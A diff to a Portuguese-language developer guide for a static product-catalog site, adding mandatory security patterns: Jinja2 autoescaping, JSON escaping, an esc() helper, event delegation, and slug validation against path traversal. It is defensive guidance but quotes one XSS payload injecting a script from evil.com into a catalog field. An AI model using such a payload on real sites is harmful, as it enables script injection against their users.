@@ -718,4 +718,72 @@ Estrutura interna: head sticky → canvas 3D → grid (specs | gráfico) → act
 | 404 nos JSONs de geometria | Path relativo `./data/` em vez de `/data/` | Sempre usar path absoluto `/data/` — página serve em `/{slug}/` |
 | Cores IFC presentes mas modelo cinza | `vertexColors: false` ou `color` não branca | `vertexColors: hasCol` e `color: 0xffffff` quando há `col[]` |
 | `geom.setIndex(data.idx)` explode | `data.idx` é `undefined` em geo expandida | Guard: `if (data.idx) geom.setIndex(data.idx)` |
+
+---
+
+## Segurança — padrões obrigatórios
+
+### Jinja2: autoescape=True
+
+O `Environment` do Jinja2 em `build.py` **deve** usar `autoescape=True`. Com `autoescape=False`, variáveis como `catalog.titulo`, `catalog.fabricante` e `catalog.filtros` são emitidas sem escaping — um `.aq` de terceiro com `NOME_PECA = </title><script src="evil.com/x.js"></script>` resulta em XSS no HTML servido pela Vercel.
+
+```python
+env = Environment(
+    loader=FileSystemLoader(...),
+    undefined=StrictUndefined,
+    autoescape=True,   # OBRIGATÓRIO — dados do .aq são entrada não-confiável
+)
+```
+
+Os templates usam `{{ catalog | tojson | safe }}` para o bloco `<script>` — isso é seguro porque o filtro `tojson` do Jinja2 escapa `<`/`>` como `<`/`>`.
+
+### Fallback sem Jinja2: escapar `<` e `>` no JSON
+
+No fallback sem Jinja2, `json.dumps` padrão **não** escapa `</script>`. Usar:
+
+```python
+def _json_for_html(obj):
+    return (json.dumps(obj, ensure_ascii=False)
+            .replace('<', '\\u003c')
+            .replace('>', '\\u003e'))
+```
+
+### Templates: `esc()` obrigatório no innerHTML
+
+Dados de texto livre (`item.nome`, `item.serie`, `item.conexoes`, chaves e valores de `item.specs`) são inseridos via `innerHTML` nos cards e no modal. Sempre usar `esc()` nesses pontos — o JSON dentro do `<script>` estar seguro não protege o `innerHTML`:
+
+```javascript
+function esc(s) {
+  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+// Uso:
+`<div class="card-name">${esc(item.nome)}</div>`
+`<tr><th>${esc(k)}</th><td>${esc(v)}</td></tr>`
+```
+
+### Event delegation — sem onclick inline com dados de usuário
+
+Não usar `onclick="openModal('${item.id}')"` nem `onclick="filterBy('${f}',this)"` — interpolação direta em atributos `onclick` é vetor de JS injection. Usar event delegation no container:
+
+```javascript
+document.getElementById('grid-root').addEventListener('click', function(e) {
+  var card = e.target.closest('.card');
+  if (card) openModal(card.dataset.id);   // id vem do DOM, não de string interpolada
+});
+document.getElementById('toolbar').addEventListener('click', function(e) {
+  var btn = e.target.closest('.chip');
+  if (btn) filterBy(btn.dataset.filter, btn);
+});
+```
+
+### Slug validado em build.py
+
+O `slug` do catálogo e o `geo` de cada produto são usados em paths de diretório e arcnames do ZIP. `build.py` valida ambos com `_assert_safe_slug()` antes de qualquer operação de I/O — lança `ValueError` imediatamente se o valor contiver `..`, `/`, ou caracteres especiais:
+
+```python
+_SAFE_SLUG_RE = re.compile(r'^[a-z0-9][a-z0-9\-_]*$')
+def _assert_safe_slug(value, field):
+    if not _SAFE_SLUG_RE.match(str(value)):
+        raise ValueError(f'Valor inválido para {field}: {value!r}')
+```
 | `cleanUrls` funciona na Vercel mas não local | Comportamento de servidor | Localmente usar extensão `.html`; na Vercel a rota sem extensão funciona |
